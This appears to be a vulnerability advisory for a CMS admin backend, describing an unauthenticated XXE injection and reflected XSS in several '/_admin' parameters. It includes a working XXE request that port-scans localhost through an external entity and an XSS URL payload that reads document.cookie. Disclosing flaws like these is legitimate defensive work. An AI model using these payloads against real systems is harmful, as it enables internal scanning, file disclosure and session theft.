Details.
The CMS is vulnerable to multiple security vulnerabilities, such as XML 
eXternal Entities (XXE) injection and Cross-Site Scripting (XSS). 

1. XXE Injection:
XXE injection allows a wide range of XML based attacks, including local 
file disclosure, TCP port scans and a Denial of Service (DoS) condition, 
which can be achieved by recursive entity injection, attribute blow up 
and other types of injection.  

The following resource accessible by an unauthenticated user is 
vulnerable:
/_admin/?SQ_ACTION=asset_map_request/

Proof of Concept (port scanning).
Request:
POST /_admin/?SQ_ACTION=asset_map_request HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, 
pre-check=0
Pragma: no-cache
User-Agent: Mozilla/4.0 (Windows 7 6.1) Java/1.7.0_02
Host: xxxxxx.com
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Proxy-Connection: keep-alive
Content-Length: 84
Connection: close

<!DOCTYPE scan [<!ENTITY test SYSTEM "http://localhost:22">]>

Response:

Pragma: no-cache
Content-Length: 214

Connection: keep-alive

<error>simplexml_load_file(http://localhost:22) [function.simplexmlload-
file]: failed to open stream: HTTP request failed! SSH-
2.0-OpenSSH_4.3

File: [SYSTEM_ROOT]/core/lib/asset_map/asset_map.inc
Line:581</error>

2. XSS:
Cross-Site Scripting (XSS) may be used to steal session information, 
etc.

Several resources of the /_admin page are affected including:
am_section parameter, assetid parameter, sq_asset_path parameter, 
sq_backend_log_type parameter, sq_link_path parameter, 
asset_ei_screen parameter, current_assetid parameter and 
tool_reindex_reindexing_root_assetid [assetid] parameter.

Proof of Concept. 
/_admin/?SQ_BACKEND_PAGE=main&backend_section=am&am_section=ed
it_asset"><script>alert(document.cookie)</script>&assetid=73&s
q_asset_path=%2C1%2C73&sq_link_path=%2C0%2C74&asset_ei_screen=
details
